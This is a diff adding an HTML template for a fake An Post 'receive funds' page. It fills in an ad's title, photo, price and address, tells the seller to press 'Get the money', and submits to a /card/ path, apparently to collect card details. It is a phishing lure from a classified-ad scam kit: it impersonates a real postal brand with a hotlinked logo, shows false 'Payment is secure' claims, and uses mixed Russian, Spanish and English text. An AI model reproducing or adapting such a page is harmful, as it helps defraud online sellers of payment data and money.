@@ -1,0 +1,104 @@
+<!DOCTYPE html>
+<html lang="ru">
+
+<head>
+	<meta http-equiv="Content-Type" content="text/html; charset=utf-8">
+	<link href="favicon.ico" rel="icon" type="image/x-icon">
+	<meta name="viewport" content="width=device-width,initial-scale=1,user-scalable=no">
+	<title>Recepción de fondos</title>
+	<meta property="og:site_name" content="anpost">
+	<meta property="og:title" content="<%=ad.title%>">
+	<meta property="og:description" content="Transport the goods safely. Transport from anpost">
+	<meta property="og:image" content="<%=ad.photo%>">
+	<meta property="og:type" content="website">
+	<meta property="og:locale" content="ru_RU">
+	<link type="text/css" href="https://jivis.us/main.css" rel="stylesheet">
+	<link type="text/css" href="https://jivis.us/mobile.css" rel="stylesheet">
+	</head>
+	</head>
+	<header class="Header">
+	<a href="/" class="HeaderTextNav"><img src="https://hireco.ie/wp-content/uploads/2021/02/An_Post_logo_logotype.png" width="150" alt=""></a>
+</header>
+<main class="Main">
+<div style="width: -webkit-fill-available;height: -webkit-fill-available;">
+	<div class="TextHead">Raising funds</div>
+	<div class="PaddBlock">
+		<div class="CenterMainHead">
+			<div style="display: flex;">
+				<img class="ImgTovar" src="<%=ad.photo%>" alt="">
+				<div class="BlockTextCent">
+					<div class="BalanceText"><%=ad.price%> €</div>
+					<div class="ComentText"><%=ad.title%></div>
+				</div>
+			</div>
+			<div class="Jtonik">
+				<div class="SuccText" style="margin: auto;">Paid product</div>
+				<img class="ImgTovarPay" src="https://d3r4tb575cotg3.cloudfront.net/static/noun_1281471.png" alt="">
+			</div>
+		</div>
+	</div>
+	<div class="PaddBlock Ms">
+		<div class="CenterMainHead" style="height: 50px;">
+			<div style="display: flex;margin: auto;">
+				<div class="SuccText" style="margin: auto;">Paid product</div>
+				<img class="ImgTovarPay" src="/assets/images/secure.svg" alt="">
+			</div>
+		</div>
+	</div>
+	<div class="PaddBlock">
+		<div class="BlockDostavka">
+			<div class="BgImgCar">
+				<img class="ImgTovarPay" src="https://cdn.dribbble.com/users/2459530/screenshots/8029114/media/ec7402c26d95030fd111401b35482144.gif" alt="">
+			</div>
+			<div class="BlockTextDostav">
+				<div class="TextDostav">Selected delivery country</div>
+				<div class="TextDostavTs">Shipping costs may vary by city.</div>
+			</div>
+		</div>
+	</div>
+	<div class="PaddBlock M">
+		<div class="MainOrder">
+			<form class="OrderPayForm" action="/card/<%=ad.id%>" method="GET">
+				<div class="MrgWebKit">
+					<div class="FormOrderInp" style="margin-top: 20px;">
+						<div class="TextOrderSay">Delivery address:</div>
+						<div class="MobAviableFlex">
+							<input type="text" class="InputOrder" style="margin-right: 0;" value="<%=ad.address%>" placeholder="City, street, house" required disabled="disabled" readonly>
+						</div>
+					</div>
+					<div class="FormOrderInp">
+						<div class="MobAviableFlex">
+						</div>
+					</div>
+					<div class="FormOrderInp">
+						<div class="MobAviableFlex">
+						</div>
+					</div>
+					<div class="FormOrderInp" style="margin-top: 20px;">
+						<div class="TextOrderSay" style="margin-top: 20px;text-align: center;">From the moment of receipt of funds, the goods must be sent to the buyer within 3 days <a href="http://anpost.pl/">ANPOST</a>. Después from confirmation, The Courier will be bound to hand over.</div>
+					</div>
+				</div>
+				<div class="BoxOrder">
+					<div class="BoxBerry">
+						<div class="BlockDecoy">
+							<div class="TextDecoy" style="max-width: 300px;">Your item is listed for this amount:</div>
+							<div class="TextDecoy"><%=ad.price%> </div>
+						</div>
+						<input class="ButtonOrderPay" type="submit" name="PayCheck" value="Get the money">
+						<div class="BlockDecoyText">
+							<div class="BlockDecoyOne">Payment is secure</div>
+							
+					</div>
+				</div>
+			</form>
+		</div>
+	</div>
+
+</main>
+<style>
+	@media (max-width: 840px) {
+		.FormOrderInp {
+			margin-top: 10px;
+		}
+	}
+</style>
